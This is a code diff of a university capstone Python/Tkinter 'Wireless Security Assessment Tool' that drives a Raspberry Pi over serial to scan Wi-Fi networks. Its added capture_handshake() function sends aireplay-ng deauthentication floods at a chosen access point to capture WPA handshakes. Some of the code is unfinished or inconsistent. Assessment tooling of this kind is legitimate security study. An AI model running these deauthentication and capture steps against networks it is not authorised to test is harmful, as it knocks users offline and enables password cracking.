@@ -1,7 +1,7 @@
 about = \
 '''
 Script Purpose: Capstone Project (CYBV498)
-Script Version: 1.3 February 2021
+Script Version: 1.6 February 2021
 Script Author:  Gabriel Haab, University of Arizona
 
 Script Revision History (Python 3.8.2):
@@ -11,6 +11,7 @@ Version 1.2 February 2021, - Tkinter Images + about menu + some structures
 Version 1.3 February 2021, - Loading window + some structures
 Version 1.4 March 2021, - Fixes on previous functions + network selection
 Version 1.5 March 2021 - Adjusted Assessment TKinter windows
+Version 1.6 March 2021 - Added comments
 '''
 
 #Third party imports
@@ -80,6 +81,7 @@ def read_data(command_send):
             #return 0
         except Exception as err:
             print("EXCEPTION ERROR: " + str(err))        
+
 """
 ================================================================
 ================================================================
@@ -101,6 +103,7 @@ def callback(event):
     print("Sending command: " + command_send)
     ser.write(bytes(command_send + "\n", encoding='utf8'))
     read_data(command_send)    
+
 """
 ================================================================
 ================================================================
@@ -140,6 +143,7 @@ def send_command1(command):
             #return 0
         except Exception as err:
             print("EXCEPTION ERROR: " + str(err))            
+            
 """
 ================================================================
 ================================================================
@@ -150,12 +154,27 @@ def send_command(command):
     ser.write(bytes(command + "\n", encoding='utf8'))
     
     rcvd = command
+    '''
+    while (command.split()[0] in rcvd.strip()) or rcvd.strip() == '':
+        received_data = ser.readline()  
+        rcvd = str(received_data.decode('ascii'))
+        #print("test" + str(rcvd))
+    '''
+    #print("Received: " + rcvd)
+    return rcvd
+
+def send_command2(command):
+    
+    # print("sending command: " + command) 
+    ser.write(bytes(command + "\n", encoding='utf8'))
+    
+    rcvd = command
     
     while (command.split()[0] in rcvd.strip()) or rcvd.strip() == '':
         received_data = ser.readline()  
         rcvd = str(received_data.decode('ascii'))
         #print("test" + str(rcvd))
-
+    
     #print("Received: " + rcvd)
     return rcvd
 """
@@ -168,8 +187,8 @@ parses the valuable information and saves into a dict named
 """
 def read_csv():
     try:
-        with open("search.cap-01.csv",'r') as f:
-            with open("search.cap-01.csv_updated.csv",'w') as f1:
+        with open("Full_Scan-01.csv",'r', encoding="utf8") as f:
+            with open("Full_Scan-01.csv_updated.csv",'w') as f1:
                 next(f) # skip header line
                 for line in f:
                     f1.write(line)
@@ -177,7 +196,7 @@ def read_csv():
         f.close()
         data = {} 
         
-        with open('search.cap-01.csv_updated.csv', "r") as csvfile:
+        with open('Full_Scan-01.csv_updated.csv', "r") as csvfile:
             csv_reader  = csv.DictReader(csvfile, delimiter=',')
             for row in csv_reader:
                 #print(row)
@@ -206,7 +225,9 @@ def terminal_commands():
         callback('<Return>')
         terminal_window.bind('<Return>', callback)
     except:
-        close_connection()
+        pass
+        #close_connection()
+
 """
 ================================================================
 close_connection()
@@ -222,6 +243,7 @@ def close_connection():
     except:
         terminal_window.destroy()
         pass
+
 """
 ================================================================
 TODO: CHANGE to auto_login().
@@ -277,6 +299,7 @@ def wait_Login():
                 pass
     except:
         print("Error reading from " + serial_port)
+
 """
 ================================================================
 start_terminal()
@@ -296,6 +319,7 @@ def start_terminal():
     
     #wait_Login()
     terminal_commands()
+
 """
 ================================================================
 transfer_over_serial()
@@ -306,10 +330,17 @@ to this tool, which will then convert back to the original format.
 """
 def transfer_over_serial(file_name):
     try:
-        b64data = send_command("base64 " + file_name + " -w 0 | wc -c && echo") 
+        # clean buffer
+        received_data = ser.read()              #read serial port
+        time.sleep(1) #check for remaining byte
+        received_data += ser.read(ser.inWaiting())  
+        
+        # clean buffer
+        
+        b64data = send_command2("base64 " + file_name + " -w 0 | wc -c && echo") 
         print("Lenght to be transferred: " + str(b64data), flush=True)
         #loading_bar(int(int(b64data)/12000),"Transferring file\n" + file_name)
-        b64data = send_command("base64 " + file_name + " -w 0 && echo") 
+        b64data = send_command2("base64 " + file_name + " -w 0 && echo") 
         print("Received: " + str(len(b64data)))
         
         print("Creating the file...")
@@ -323,6 +354,7 @@ def transfer_over_serial(file_name):
     except Exception as err:
         print("Error: " + str(err))
         return 0
+
 """
 ================================================================
 loading_bar()
@@ -332,6 +364,7 @@ This function creates a thread that will hold a loading bar.
 def loading_bar(time_to_load, message):
     x_thread = threading.Thread(target=loading_bar_1, args=(time_to_load, message, root,))
     x_thread.run()
+
 """
 ================================================================
 loading_bar_1()
@@ -368,6 +401,7 @@ def loading_bar_1(time_to_load, message, root):
     except Exception as err:
         print("error: " + str(err))
         messagebox.showinfo("ERROR", message + " Cancelled")  
+
 """
 ================================================================
 rogueAP()
@@ -401,6 +435,7 @@ def rogueAP():
     close_button.grid(row=5,columnspan=2)  
     
     rogueAP_window.mainloop()
+
 """
 ================================================================
 wifi_Assessment()
@@ -422,6 +457,7 @@ def wifi_Assessment():
     next_button.grid(row=2,column=1,padx=5, pady=5, ipadx=5, ipady=5)
     back_button.grid(row=2,column=0,padx=5, pady=5, ipadx=5, ipady=5)
     Assessment_window.mainloop()    
+
 """
 ================================================================
 assessment_manager()
@@ -429,15 +465,22 @@ This function is responsible for defining if the tool will perform
 an authenticated scan or not. 
 ================================================================
 """
-def assessment_manager():
-    Authentication = 0
+def assessment_manager(Assessment_window, message, next_button,back_button, Authentication):
     if Authentication:
         print("Authenticate Scanning")
-        connect_to_wireless() 
-        analyze_traffic()
+        back_button.destroy()
+        
+        message.config(text="Please type in the password for:\n\n ESSID: " + selected_network['ESSID'])
+        password_input = tk.Entry(Assessment_window)
+        next_button.config(text="Next",command= lambda: analyze_traffic(Assessment_window, message, next_button,back_button,1))
+        password_input.grid(row=1,columnspan=2,padx=5, pady=5, ipadx=5, ipady=5)
+
+        Assessment_window.update()
+        
     else:
         print("Non-Authenticate Scanning") 
         encryption_Manager()
+
 """
 ================================================================
 connect_to_wireless()
@@ -445,9 +488,54 @@ This function is responsible for connecting the rapsberry pi to
 the target network. This is used for an authenticated scan.
 ================================================================
 """       
-def connect_to_wireless():
+def connect_to_wireless(ESSID,PASS):
     # This function will connect to the wireless via WPAClient():
     print("Function to connect to the wireless network") 
+    # Creating/editing the WPA_Supplicant file.
+    send_command("echo 'ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev' > /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo 'update_config=1' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo 'country=US' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo ' ' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo 'network={' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo '        ssid=\"" + ESSID + "\"' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo '        psk=\"" + PASS + "\"' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo '        scan_ssid=1' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    send_command("echo '}' >> /etc/wpa_supplicant/wpa_supplicant.conf")
+    print("Done Creating file")
+    time.sleep(2)
+    print("Attempting to connect to the wireless")
+    send_command("sudo wpa_cli -i wlan0 reconfigure")
+    
+    received_data = ser.read()              #read serial port
+    time.sleep(1) #check for remaining byte
+    received_data += ser.read(ser.inWaiting())     
+    
+    print("Waiting for Connection...")
+    time.sleep(15) 
+    
+    send_command("iwconfig wlan0 | head -1")
+    
+    connection = ''
+    received_data = ser.read()              #read serial port
+    time.sleep(1)
+    data_left = ser.inWaiting()             #check for remaining byte
+    received_data += ser.read(data_left)
+    rcvd = received_data.decode('ascii')
+    #print(rcvd)
+    
+    for line in rcvd.split('\r\n'):
+        if 'raspberrypi' not in line and 'iwconfig' not in line:
+            connection = line
+    
+    print("Connection value: " + connection)
+    
+    if 'ESSID:off/' in connection: 
+        print("Failed to connect")
+        return 0
+    else:
+        print("Done Connecting. Please Check the interface")
+        return 1        
+        
 """
 ================================================================
 Function to perform an active scan in the network. 
@@ -459,6 +547,8 @@ def analyze_traffic():
     # This function will perform an nmap scan.
     # This function will also generate sobre analyses through Panda.
     print("Function to analyze the network")
+    connect_to_wireless(selected_network['ESSID'],password_input.get())
+
 """
 ================================================================
 encryption_Manager()
@@ -477,7 +567,9 @@ def encryption_Manager(encryption):
         
     if encryption == "WPA3":
         print ("The Encryption is WPA3")
-        capture_Handshake()
+        capture_handshake()
+        airgraph("/root/temp/" + selected_network[BSSID] + ".csv")   
+        
 """
 ================================================================
 monitor_mode()
@@ -485,22 +577,88 @@ This function is responsible for switching the wireless card into
 monitor mode. 
 ================================================================
 """    
-def monitor_mode(mode,card):
+def monitor_mode(mode,card,channel):
     if mode == "enable":
         print("enabling the monitor mode on " + card)
-        send_command("sudo iw dev " + card + " interface add mon0 type monitor")
+        #send_command("sudo iw dev " + card + " interface add mon0 type monitor")
+        send_command("airmon-ng start " + card + " " + channel)
+        time.sleep(3) # wait 3 seconds just in case.
+    
     if mode == "disable": 
         print("disabling the monitor mode on " + card)
-        send_command("iw dev mon0 interface del")
+        #send_command("iw dev mon0 interface del")
+        send_command("airmon-ng stop " + card + "mon")
+        time.sleep(3) # wait 3 seconds just in case.
+
 """
 ================================================================
 capture_handshake()
 This function performs the attack to capture the 4way handshake.
 ================================================================
 """    
-def capture_handshake():
-    print("capture_handshake")
+def capture_handshake(selected_network):
+    '''
+    selected_network = {}
+    selected_network['channel'] = '3'
+    selected_network['BSSID'] = '00:18:E7:E9:32:E2'
+    selected_network['ESSID'] = 'CYBV_498_Test'
     
+    print("capture_handshake")
+    selected_network
+    '''
+    remove_temp() 
+    print("Enabling monitor mode")
+    monitor_mode("enable", "wlan1", selected_network['channel'])
+    
+    print("starting tmux")
+    send_command("tmux new -s 'capture_handshake' -d")
+    send_command("tmux new-window -t 'capture_handshake' -n:airodump-ng 'timeout 35s airodump-ng -c "  + selected_network['channel'] + " --bssid " + selected_network['BSSID'] + " -w /root/temp/" + selected_network['ESSID'] + " wlan1mon'")
+    
+    print("starting aireplay")
+    
+    # Deauthentication
+    time.sleep(5)
+    send_command("aireplay-ng -0 10 -a " + selected_network['BSSID'] + " wlan1mon")
+    time.sleep(10)
+    send_command("aireplay-ng -0 10 -a " + selected_network['BSSID'] + " wlan1mon")
+    time.sleep(10)
+    time.sleep(5)
+    
+    print("kill tmux session")
+    send_command("tmux kill-session -t 'capture_handshake'")
+                 
+    print("Disable monitor mode")
+    monitor_mode("disable","wlan1","")
+    print("done") 
+    
+"""
+================================================================
+airgraph()
+This function generates a graph of connected devices, and probing 
+devices.
+================================================================
+"""
+
+def airgraph(file):
+    send_command("airgraph-ng -i " + file + " -o /root/temp/Client_To_AP.png" + " -g CAPR")
+    time.sleep(20)
+    send_command("airgraph-ng -i " + file + " -o /root/temp/Client_Probe.png" + " -g CPG")
+    time.sleep(20)
+    
+    # Transfer files:
+    print("Done Creating Images")
+    x = 0
+    while x == 0:
+        x = transfer_over_serial('/root/temp/Client_To_AP.png')
+        time.sleep(5)
+    x = 0
+    print("Done CAPR")
+    while x == 0:
+        x = transfer_over_serial('/root/temp/Client_Probe.png') 
+        time.sleep(5)
+    print("Done CPG")
+        
+
 """
 ================================================================
 remove_temp()
@@ -512,6 +670,7 @@ def remove_temp():
     print("Deleting the TEMP folder")
     send_command1("rm /root/temp/*") 
     time.sleep(2)
+
 """
 ================================================================
 scanNetwork()
@@ -526,19 +685,20 @@ def scanNetwork(Assessment_window, message, next_button, back_button):
     # Performing the activities
     # ==================================================
     remove_temp() 
-    monitor_mode("enable", "wlan1")
+    monitor_mode("enable", "wlan1","")
     
     print("sending scanning command")
-    send_command1("timeout 15s airodump-ng mon0 -w /root/temp/search.cap &> file") 
+    send_command1("timeout 15s airodump-ng wlan1mon -w /root/temp/Full_Scan &> /root/temp/file") 
     loading_bar(20,'Scanning for Networks')
     
     #transfer over the .csv file
     print("Transferring the file")
-    x = 1
+    x = 0
     while x == 0:
-        x = transfer_over_serial('/root/temp/search.cap-01.csv')
-    
+        x = transfer_over_serial('/root/temp/Full_Scan-01.csv')
+        time.sleep(5)
     data = read_csv()
+    monitor_mode("disable", "wlan1","")
     
     # ==================================================
     # ==================================================    
@@ -546,7 +706,10 @@ def scanNetwork(Assessment_window, message, next_button, back_button):
     list_grid = Assessment_window.grid_slaves()
     for l in list_grid:
         l.destroy() 
-        
+    
+    Assessment_window.update()
+    network_name = tk.StringVar()
+    network_name.set("Please Select a Network") # default value        
         
     message = tk.Label(Assessment_window,text="Please select the network to perform the assessment", font=("Helvetica 12 bold"))
     OptionMenu_button = tk.OptionMenu(Assessment_window, network_name, *data.keys())
@@ -560,6 +723,7 @@ def scanNetwork(Assessment_window, message, next_button, back_button):
     back_button.grid(row=2,column=0,padx=5, pady=5, ipadx=5, ipady=5)    
     
     Assessment_window.update()
+
 """
 ================================================================
 select_network()
@@ -572,8 +736,9 @@ def select_network(Assessment_window, message, next_button,back_button,OptionMen
     global selected_network
     Assessment_window.update()
     selected_network = {}
+    ESSID = network_name.get()
     if network_name.get() != "Please Select a Network":
-        selected_network['ESSID'] = network_name.get()
+        selected_network['ESSID'] = ESSID
         selected_network['Privacy'] = data[ESSID][0]
         selected_network['BSSID'] = data[ESSID][1]
         selected_network['Channel'] = data[ESSID][2]
@@ -581,11 +746,12 @@ def select_network(Assessment_window, message, next_button,back_button,OptionMen
         OptionMenu_button.destroy()
         
         message.config(text="You Selected:\n\n ESSID: " + selected_network['ESSID'] + " \nEncryption: " + selected_network['Privacy'] + " \nBSSID: " + selected_network['BSSID'] + " \nChannel: " + selected_network['Channel'])
-        next_button.config(text="Generate Report",command= lambda: generate_report(Assessment_window, message, next_button,back_button))
-        back_button.config(text="Back",command= lambda: scanNetwork(Assessment_window, message, next_button,back_button))                   
+        next_button.config(text="Authenticated Scan",command= lambda: assessment_manager(Assessment_window, message, next_button,back_button,1))
+        back_button.config(text="Non-Authenticated Scan",command= lambda: assessment_manager(Assessment_window, message, next_button,back_button,0))                   
     else:
         messagebox.showinfo("ERROR", "PLEASE SELECT A NETWORK\nFROM THE DROPDOWN MENU")
         scanNetwork(Assessment_window, message, next_button,back_button)
+
 """
 ================================================================
 generate_report()
@@ -612,6 +778,7 @@ def generate_report(Assessment_window, message, next_button,back_button):
     Assessment_window.update()
     
     monitor_mode("disable","wlan1")
+
 """
 ================================================================
 compare_channels()
@@ -670,6 +837,7 @@ def menuAbout():
     label1.grid(row=1,column=0,padx=5, pady=10, ipadx=15, ipady=10)
     close_button.grid(row=2,column=0,padx=5, pady=10, ipadx=15, ipady=10)
     about_window.mainloop()
+
 """
 ================================================================
 main()
@@ -683,8 +851,8 @@ if __name__ == '__main__':
     root.title("CYBV 498 - Wireless Security Assessment Tool")
     root.resizable(False, False)
     
-    start_Assessment_button = tk.Button(text='Start Assessment',command=wifi_Assessment, font=("Helvetica 12 bold"))
-    #start_Assessment_button = tk.Button(text='Read_File to tkinter',command=lambda: transfer_over_serial_thread('/root/temp/search.cap-01.csv'), font=("Helvetica 12 bold"))
+    #start_Assessment_button = tk.Button(text='Start Assessment',command=wifi_Assessment, font=("Helvetica 12 bold"))
+    start_Assessment_button = tk.Button(text='Get Graph',command=lambda: airgraph("/root/temp/Full_Scan-01.csv"), font=("Helvetica 12 bold"))
     
     rogueAP_button = tk.Button(text='Rogue AP',command=rogueAP, font=("Helvetica 12 bold"))
     terminal_button=tk.Button(text='Serial Terminal',command=start_terminal, font=("Helvetica 12 bold"))
@@ -709,8 +877,8 @@ if __name__ == '__main__':
     root.config(menu=menuBar)  # menu ends    
     
     try:
-        pass
-        #ser = serial.Serial(serial_port, baud_rate)
+        #pass
+        ser = serial.Serial(serial_port, baud_rate)
     except:
         messagebox.showinfo("ERROR", "Unable to connect via serial")
         root.destroy()
